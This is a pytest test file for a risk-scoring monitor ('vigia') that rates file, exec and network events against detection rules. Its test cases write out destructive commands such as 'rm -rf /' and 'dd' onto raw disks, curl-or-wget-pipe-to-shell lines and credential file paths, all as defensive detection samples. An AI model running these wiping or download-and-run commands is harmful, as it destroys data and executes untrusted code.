"""The risk of one event (T08): ``assess`` on hand-made rules and on the default ones. Pure, so
no black box, no clock and no threads."""

import time
from collections.abc import Mapping
from typing import Any

import pytest

from vigia.analyzer import History, Observation, assess, default_rules, parse_rules
from vigia.analyzer.assess import MAX_WEIGHT

DEFAULTS = default_rules().rules


def seen(
    action: str = "delete",
    target: str = "work/a.txt",
    *,
    source: str = "file",
    ts: float = 1000.0,
    **details: Any,
) -> Observation:
    return Observation(ts, source, action, target, details)


def rules_from(*bodies: str) -> tuple:
    text = ""
    for index, body in enumerate(bodies):
        text += f'\n[[rule]]\nid = "r{index}"\ndescription = "Regla {index}"\n{body}\n'
    return parse_rules(text).rules


def risk_of(event: Observation, rules: tuple, history: History | None = None) -> int:
    return assess(event, history or History(), rules).risk


# -- selection -------------------------------------------------------------------------------


def test_no_rule_no_risk() -> None:
    result = assess(seen("modify"), History(), DEFAULTS)
    assert (result.risk, result.rules) == (0, ())


def test_source_action_and_target_all_have_to_match() -> None:
    rules = rules_from('risk = 2\nsource = "file"\naction = "delete"\ntarget = "*.pem"')
    assert risk_of(seen("delete", "k/a.pem"), rules) == 2
    assert risk_of(seen("modify", "k/a.pem"), rules) == 0
    assert risk_of(seen("delete", "k/a.txt"), rules) == 0
    assert risk_of(seen("delete", "k/a.pem", source="net"), rules) == 0


def test_the_highest_risk_wins_and_every_match_is_listed_strongest_first() -> None:
    rules = rules_from(
        'risk = 1\nsource = "file"',
        'risk = 3\nsource = "file"\naction = "delete"',
        'risk = 2\nsource = "file"\ntarget = "work/*"',
    )
    result = assess(seen(), History(), rules)
    assert result.risk == 3
    assert result.rules == ("r1", "r2", "r0")
    assert result.top_description == "Regla 1"


# -- details ---------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("condition", "details", "expected"),
    [
        ('{ field = "nlink", op = "gt", value = 1 }', {"nlink": 2}, True),
        ('{ field = "nlink", op = "gt", value = 1 }', {"nlink": 1}, False),
        ('{ field = "nlink", op = "ge", value = 1 }', {"nlink": 1}, True),
        ('{ field = "nlink", op = "lt", value = 2 }', {"nlink": 1}, True),
        ('{ field = "nlink", op = "le", value = 1 }', {"nlink": 1}, True),
        ('{ field = "nlink", op = "gt", value = 1 }', {"nlink": True}, False),  # True is not 1
        ('{ field = "nlink", op = "gt", value = 1 }', {"nlink": "9"}, False),
        ('{ field = "nlink", op = "gt", value = 1 }', {}, False),  # missing fails
        ('{ field = "type", op = "eq", value = "symlink" }', {"type": "symlink"}, True),
        ('{ field = "type", op = "eq", value = "symlink" }', {"type": "file"}, False),
        ('{ field = "type", op = "eq", value = "symlink" }', {}, False),
        ('{ field = "type", op = "ne", value = "symlink" }', {"type": "file"}, True),
        ('{ field = "type", op = "ne", value = "symlink" }', {}, False),  # missing fails
        ('{ field = "flag", op = "eq", value = true }', {"flag": True}, True),
        ('{ field = "flag", op = "eq", value = true }', {"flag": 1}, False),
        ('{ field = "n", op = "eq", value = 1 }', {"n": True}, False),
        ('{ field = "n", op = "eq", value = 1 }', {"n": 1.0}, True),
        ('{ field = "type", op = "in", value = ["dir", "file"] }', {"type": "dir"}, True),
        ('{ field = "type", op = "in", value = ["dir", "file"] }', {"type": "other"}, False),
        ('{ field = "link", op = "glob", value = "/*" }', {"link": "/etc"}, True),
        ('{ field = "link", op = "glob", value = "/*" }', {"link": "etc"}, False),
        ('{ field = "link", op = "glob", value = "/*" }', {"link": 5}, False),
        ('{ field = "link", op = "exists", value = true }', {"link": ""}, True),
        ('{ field = "link", op = "exists", value = true }', {}, False),
        ('{ field = "link", op = "exists", value = false }', {}, True),
        ('{ field = "counts.delete", op = "ge", value = 20 }', {"counts": {"delete": 25}}, True),
        ('{ field = "counts.delete", op = "ge", value = 20 }', {"counts": {"create": 25}}, False),
        ('{ field = "counts.delete", op = "ge", value = 20 }', {"counts": 25}, False),
    ],
)
def test_conditions_on_details(condition: str, details: Mapping[str, Any], expected: bool) -> None:
    rules = rules_from(f'risk = 2\nsource = "file"\nwhere = [{condition}]')
    assert (risk_of(seen("create", **details), rules) == 2) is expected


def test_all_conditions_have_to_hold() -> None:
    rules = rules_from(
        'risk = 2\nwhere = [{ field = "a", op = "eq", value = 1 }, '
        '{ field = "b", op = "eq", value = 2 }]'
    )
    assert risk_of(seen(a=1, b=2), rules) == 2
    assert risk_of(seen(a=1, b=3), rules) == 0


# -- bursts ----------------------------------------------------------------------------------


def run(rules: tuple, events: list[Observation]) -> list[int]:
    """Assess events one after the other, recording each in the history."""
    history = History()
    risks = []
    for event in events:
        result = assess(event, history, rules)
        history.add(result.contributions, event.ts)
        risks.append(result.risk)
    return risks


def test_a_burst_needs_its_count_inside_the_window_this_event_included() -> None:
    rules = rules_from(
        'risk = 3\nsource = "file"\naction = "delete"\nburst = { count = 3, window = 10 }'
    )
    events = [seen(ts=100.0 + i) for i in range(5)]
    assert run(rules, events) == [0, 0, 3, 3, 3]


def test_events_outside_the_window_do_not_count() -> None:
    rules = rules_from(
        'risk = 3\nsource = "file"\naction = "delete"\nburst = { count = 3, window = 10 }'
    )
    slow = [seen(ts=100.0 + 6 * i) for i in range(6)]  # 2 in any 10 s
    assert run(rules, slow) == [0] * 6
    # Two, a long silence, one: the two are forgotten.
    assert run(rules, [seen(ts=0.0), seen(ts=1.0), seen(ts=500.0)]) == [0, 0, 0]


def test_only_events_that_fit_the_rule_count_for_its_burst() -> None:
    rules = rules_from(
        'risk = 3\nsource = "file"\naction = "delete"\nburst = { count = 3, window = 10 }'
    )
    mixed = [seen("delete"), seen("create"), seen("modify"), seen("delete"), seen("create")]
    assert run(rules, [*mixed, seen("delete")]) == [0, 0, 0, 0, 0, 3]


def test_a_burst_that_sums_a_field_weighs_each_event_by_it() -> None:
    rules = rules_from(
        'risk = 3\naction = "summary"\nburst = { count = 100, window = 60, sum = "counts.delete" }'
    )
    events = [
        seen("summary", ts=0.0, counts={"delete": 40}),
        seen("summary", ts=1.0, counts={"create": 900}),  # no deletes: weighs nothing
        seen("summary", ts=2.0, counts={"delete": 59}),
        seen("summary", ts=3.0, counts={"delete": 1}),
    ]
    assert run(rules, events) == [0, 0, 0, 3]


@pytest.mark.parametrize("value", [-5, "9", True, None, float("nan")])
def test_a_sum_field_that_is_not_a_positive_number_weighs_nothing(value: object) -> None:
    rules = rules_from(
        'risk = 3\naction = "summary"\nburst = { count = 2, window = 60, sum = "n" }'
    )
    assert run(rules, [seen("summary", ts=0.0, n=value), seen("summary", ts=1.0, n=value)]) == [
        0,
        0,
    ]


def test_one_huge_number_cannot_overflow_the_window() -> None:
    rules = rules_from(
        'risk = 3\naction = "summary"\nburst = { count = 5, window = 60, sum = "n" }'
    )
    history = History()
    result = assess(seen("summary", n=1e308), history, rules)
    assert result.contributions["r0"] == MAX_WEIGHT
    history.add(result.contributions, 1000.0)
    assert history.total("r0", 60, 1000.0) == MAX_WEIGHT


def test_assess_does_not_change_the_history() -> None:
    rules = rules_from('risk = 3\nsource = "file"\nburst = { count = 2, window = 10 }')
    history = History()
    for _ in range(5):
        assert assess(seen(), history, rules).risk == 0
    assert history.rules_tracked == 0


def test_the_history_forgets_and_stays_small() -> None:
    history = History()
    for second in range(10_000):
        history.add({"r": 1.0}, float(second))
        history.total("r", 60, float(second))
    assert history.total("r", 60, 9999.0) == 60.0
    assert len(history._buckets["r"]) <= 61  # noqa: SLF001
    assert history.total("r", 60, 100_000.0) == 0.0
    assert history.rules_tracked == 0


def test_a_clock_that_steps_back_cannot_break_the_history() -> None:
    history = History()
    history.add({"r": 1.0}, 100.0)
    history.add({"r": 1.0}, 50.0)
    assert history.total("r", 60, 100.0) == 2.0


# -- the default rules -----------------------------------------------------------------------


def risk_with_defaults(event: Observation, history: History | None = None) -> tuple[int, tuple]:
    result = assess(event, history or History(), DEFAULTS)
    return result.risk, result.rules


def test_ordinary_work_is_risk_zero() -> None:
    for action in ("create", "modify", "delete", "move"):
        assert risk_with_defaults(seen(action, "work/src/app.py", type="file", nlink=1))[0] == 0
    assert risk_with_defaults(seen("dropped", ".", reason="queue_overflow"))[0] == 0
    assert risk_with_defaults(seen("summary", ".", counts={"create": 500}, folded=500))[0] == 0


def test_deleting_in_masse_is_2_then_3() -> None:
    history = History()
    risks = []
    for i in range(120):
        result = assess(seen(ts=1000.0 + i * 0.1), history, DEFAULTS)
        history.add(result.contributions, 1000.0 + i * 0.1)
        risks.append(result.risk)
    assert risks[18] == 0
    assert risks[19] == 2  # the 20th in a minute
    assert risks[98] == 2
    assert risks[99] == 3  # the 100th


def test_deleting_slowly_is_not_mass_deletion() -> None:
    history = History()
    for i in range(200):
        result = assess(seen(ts=1000.0 + i * 5), history, DEFAULTS)  # 12 a minute
        history.add(result.contributions, 1000.0 + i * 5)
        assert result.risk == 0


def test_folded_deletes_are_counted_from_the_summary() -> None:
    history = History()
    first = assess(
        seen("summary", ".", ts=0.0, counts={"delete": 300}, folded=300), history, DEFAULTS
    )
    history.add(first.contributions, 0.0)
    second = assess(
        seen("summary", ".", ts=5.0, counts={"delete": 800}, folded=800), history, DEFAULTS
    )
    assert (first.risk, second.risk) == (2, 3)
    assert "mass-delete-folded-severe" in second.rules


def test_deletes_of_files_made_in_the_same_window_do_not_count() -> None:
    """A start-up's temporary files (created and deleted within one 2 s window) destroy
    nothing that existed before: measured, 68 of the 77 deletes of an OpenClaw start."""
    history = History()
    for i in range(500):
        result = assess(seen(ts=1000.0 + i * 0.01, transient=True), history, DEFAULTS)
        history.add(result.contributions, 1000.0 + i * 0.01)
        assert result.risk == 0


def test_mixed_transient_and_real_deletes_count_only_the_real_ones() -> None:
    history = History()
    risks = []
    for i in range(60):
        details = {"transient": True} if i % 2 else {}
        result = assess(seen(ts=1000.0 + i * 0.1, **details), history, DEFAULTS)
        history.add(result.contributions, 1000.0 + i * 0.1)
        risks.append(result.risk)
    assert risks[36] == 0  # 19 real ones so far (the odd ones are transient)
    assert risks[38] == 2  # the 20th


def test_deleting_slowly_is_caught_over_an_hour() -> None:
    history = History()
    risks = []
    for i in range(2100):
        ts = 10_000.0 + i * 1.5  # 40 a minute, never 100: but 2.400 an hour
        result = assess(seen(ts=ts), history, DEFAULTS)
        history.add(result.contributions, ts)
        risks.append(result.risk)
    assert risks[:19] == [0] * 19
    assert risks[19] == 2  # 20 in 30 s: mass-delete (40 a minute is over its line of 20)
    assert 3 in risks[1000:]  # 2.000 within the hour: slow-delete-severe


def test_overwriting_and_renaming_in_masse_is_risk_2() -> None:
    for action, line in (("modify", 300), ("move", 100)):
        history = History()
        risks = []
        for i in range(line + 5):
            result = assess(
                seen(action, f"w/f{i}", ts=2000.0 + i * 0.05, type="file"), history, DEFAULTS
            )
            history.add(result.contributions, 2000.0 + i * 0.05)
            risks.append(result.risk)
        assert risks[line - 2] == 0 and risks[line - 1] == 2, action
    # In a summary the counts also hold the folders that change with every file made: no rule.
    assert risk_with_defaults(seen("summary", ".", counts={"modify": 400}, folded=400))[0] == 0
    # Renames have no such problem: a folded summary of 150 moves is the same 150.
    assert risk_with_defaults(seen("summary", ".", counts={"move": 150}, folded=150))[0] == 2
    # A folder that changes is not an overwrite.
    history = History()
    for i in range(400):
        result = assess(
            seen("modify", f"w/d{i}", ts=3000.0 + i * 0.05, type="dir"), history, DEFAULTS
        )
        history.add(result.contributions, 3000.0 + i * 0.05)
        assert result.risk == 0


def test_a_flood_of_creations_is_risk_1_and_only_when_it_is_huge() -> None:
    assert risk_with_defaults(seen("summary", ".", counts={"create": 9999}, folded=9999))[0] == 0
    risk, rules = risk_with_defaults(seen("summary", ".", counts={"create": 10000}, folded=10000))
    assert (risk, rules) == (1, ("file-flood",))


@pytest.mark.parametrize(
    "target",
    [
        ".ssh/id_rsa",
        "work/.ssh/authorized_keys",
        ".aws/credentials",
        "work/keys/server.pem",
        "work/id_ed25519",
        ".git-credentials",
        "w/.netrc",
        "w/.gnupg/pubring.kbx",
    ],
)
def test_credential_files_are_risk_2(target: str) -> None:
    for action in ("create", "modify", "delete", "move"):
        assert risk_with_defaults(seen(action, target))[0] >= 2


@pytest.mark.parametrize(
    "target", ["work/ssh-notes.md", "work/pem.txt", "work/app.py", "work/.sshd"]
)
def test_other_files_are_not_credential_files(target: str) -> None:
    assert risk_with_defaults(seen("modify", target))[0] == 0


def test_env_files_are_risk_1() -> None:
    for target in (".env", "work/.env", "work/.env.local", "work/prod.env"):
        assert risk_with_defaults(seen("modify", target)) == (1, ("env-file",))
    assert risk_with_defaults(seen("modify", "work/environment.py"))[0] == 0


@pytest.mark.parametrize(
    "target",
    ["work/a\nb", "work/x\x1b[2Jy", "work/‮gpj.exe", "work/a​b", "work/é́́́", "work/﻿x", "work/\x00x"],
)
def test_names_made_to_deceive_are_risk_1(target: str) -> None:
    assert risk_with_defaults(seen("create", target, type="file"))[0] == 1


def test_one_accent_is_a_normal_name() -> None:
    assert risk_with_defaults(seen("create", "work/café é.txt", type="file"))[0] == 0


def test_a_link_out_of_the_folder_is_risk_2() -> None:
    assert risk_with_defaults(seen("create", "w/x", type="symlink", link="/etc"))[0] == 2
    assert risk_with_defaults(seen("create", "w/x", type="symlink", link="/"))[0] == 2
    assert risk_with_defaults(seen("create", "w/x", type="symlink", link="../../../etc"))[0] == 2
    assert risk_with_defaults(seen("create", "w/x", type="symlink", link="../lib/x"))[0] == 0
    assert risk_with_defaults(seen("create", "w/x", type="symlink", link="a/b"))[0] == 0
    assert risk_with_defaults(seen("create", "w/x", type="file", link="/etc"))[0] == 0


def test_a_hard_link_is_risk_1() -> None:
    assert risk_with_defaults(seen("modify", "w/b", type="file", nlink=2)) == (1, ("hardlink",))
    assert risk_with_defaults(seen("modify", "w/b", type="file", nlink=1))[0] == 0
    assert risk_with_defaults(seen("modify", "w/d", type="dir"))[0] == 0


def ran(argv: str, binary: str = "/bin/sh") -> Observation:
    """An ``exec/exec`` event as docs/23 defines it: the binary in the target and the arguments,
    WITHOUT the binary, in ``details.argv``."""
    return seen("exec", binary, source="exec", argv=argv)


@pytest.mark.parametrize(
    ("binary", "argv"),
    [
        ("/bin/rm", "-rf /"),
        ("/bin/rm", "-fr /"),
        ("/bin/rm", "-rf /*"),
        ("/bin/rm", "-rf --no-preserve-root /"),
        ("/bin/rm", "-rf /home"),
        ("/bin/rm", "-rf /root/"),
        ("/bin/rm", "-Rf /"),
        ("/bin/sh", '-c "rm -rf /"'),
        ("/bin/bash", "-c rm -rf /*"),
        ("/bin/sh", "-c sudo rm -rf /"),
        ("/bin/dd", "if=/dev/zero of=/dev/vda bs=1M"),
        ("/bin/dd", "if=/dev/zero of=/dev/nvme0n1"),
        ("/bin/sh", '-c "dd if=/dev/zero of=/dev/sda"'),
    ],
)
def test_wiping_commands_are_risk_3(binary: str, argv: str) -> None:
    assert risk_with_defaults(ran(argv, binary))[0] == 3


@pytest.mark.parametrize(
    ("binary", "argv"),
    [
        ("/bin/rm", "-rf /tmp/build"),
        ("/bin/rm", "-rf node_modules"),
        ("/bin/rm", "-rf ./"),
        ("/bin/rm", "file.txt"),
        ("/bin/rm", "-rf /home/node/project"),
        ("/bin/bash", '-c "rm -rf build && cd /"'),
        ("/bin/bash", '-c "rm -f a.txt; cd ~"'),
        ("/bin/ls", "/"),
        ("/bin/sh", "-c echo rm -rf /x"),
        ("/bin/dd", "if=/dev/zero of=/dev/null"),
        ("/bin/sh", '-c "dd if=/dev/zero of=/dev/null bs=1M count=1"'),
        ("/bin/dd", "if=a.img of=b.img"),
    ],
)
def test_ordinary_commands_are_risk_0(binary: str, argv: str) -> None:
    assert risk_with_defaults(ran(argv, binary))[0] == 0


@pytest.mark.parametrize(
    "argv",
    [
        "-c curl https://x.sh | sh",
        "-c curl -s https://x.sh | bash -s",
        "-c wget -qO- x | bash",
        "-c curl x|sh",
        "-c curl x | sudo sh",
        "-c curl x | python3 -",
    ],
)
def test_download_and_run_is_risk_2(argv: str) -> None:
    assert risk_with_defaults(ran(argv)) == (2, ("exec-download-and-run",))


@pytest.mark.parametrize(
    "argv",
    [
        "-c curl https://x/file.tar.gz | tar xz",
        "-c curl https://x | grep sha256",
        "-c curl https://x | sha256sum",
        "-c curl x -o x.sh",
    ],
)
def test_downloading_is_not_running(argv: str) -> None:
    assert risk_with_defaults(ran(argv))[0] == 0


def test_privilege_and_disk_tools_are_risk_2() -> None:
    assert risk_with_defaults(ran("apt install x", "/usr/bin/sudo")) == (2, ("exec-privilege",))
    assert risk_with_defaults(ran("/dev/sdb1", "/usr/sbin/mkfs.ext4"))[0] == 2
    assert risk_with_defaults(ran("-n 3 notes.txt", "/usr/bin/shred"))[0] == 2
    assert risk_with_defaults(ran("-R 777 /srv", "/bin/chmod")) == (2, ("exec-chmod-open",))
    assert risk_with_defaults(ran("-c chmod -R 777 /srv"))[0] == 2
    assert risk_with_defaults(ran("644 notes.txt", "/bin/chmod"))[0] == 0
    assert risk_with_defaults(ran("ls", "/usr/bin/sudoku"))[0] == 0


def test_the_exec_rules_do_not_touch_other_sources() -> None:
    assert risk_with_defaults(seen("create", "/bin/rm", argv="-rf /"))[0] == 0


def test_a_target_thousands_of_characters_long_is_read_by_its_ends() -> None:
    long_path = "work/" + "a/" * 3000 + "id_rsa"
    assert risk_with_defaults(seen("create", long_path))[0] == 2  # the file name is still seen
    huge = "a/" * 100_000
    began = time.perf_counter()
    for _ in range(50):
        risk_with_defaults(seen("create", huge))
    assert time.perf_counter() - began < 2.0


def test_a_delete_request_is_risk_2_and_a_get_is_not() -> None:
    assert (
        risk_with_defaults(seen("request", "https://api/x", source="net", method="DELETE"))[0] == 2
    )
    assert risk_with_defaults(seen("request", "https://api/x", source="net", method="GET"))[0] == 0


def test_two_hundred_requests_a_minute_is_risk_2() -> None:
    history = History()
    risks = []
    for i in range(210):
        event = seen("request", "https://api/x", source="net", ts=2000.0 + i * 0.2, method="GET")
        result = assess(event, history, DEFAULTS)
        history.add(result.contributions, event.ts)
        risks.append(result.risk)
    assert risks[198] == 0
    assert risks[199] == 2


def test_a_name_that_held_a_secret_is_risk_1() -> None:
    assert risk_with_defaults(seen("create", "work/token=[REDACTED]", type="file")) == (
        1,
        ("secret-in-name",),
    )
    assert risk_with_defaults(seen("create", "work/notes.txt", type="file"))[0] == 0


def test_overwriting_a_thousand_files_in_a_minute_is_risk_3() -> None:
    history = History()
    risks = []
    for i in range(1005):
        ts = 4000.0 + i * 0.05
        result = assess(seen("modify", f"w/f{i}", ts=ts, type="file"), history, DEFAULTS)
        history.add(result.contributions, ts)
        risks.append(result.risk)
    assert risks[998] == 2 and risks[999] == 3


def test_a_huge_argv_is_read_by_its_ends_too() -> None:
    argv = "-c " + "curl| python3 " * 300
    began = time.perf_counter()
    for _ in range(30):
        risk_with_defaults(ran(argv))
    assert time.perf_counter() - began < 2.0


def test_unless_takes_events_out_of_a_rule_and_out_of_its_burst() -> None:
    rules = rules_from(
        'risk = 3\nsource = "file"\naction = "delete"\nunless = "*/node_modules/*"\n'
        "burst = { count = 3, window = 10 }"
    )
    noisy = [seen("delete", f"w/node_modules/p{i}", ts=100.0 + i * 0.1) for i in range(10)]
    assert run(rules, noisy) == [0] * 10  # not counted, so they never build up to the line
    real = [seen("delete", f"w/src/f{i}", ts=100.0 + i * 0.1) for i in range(4)]
    assert run(rules, [*noisy, *real]) == [0] * 12 + [3, 3]
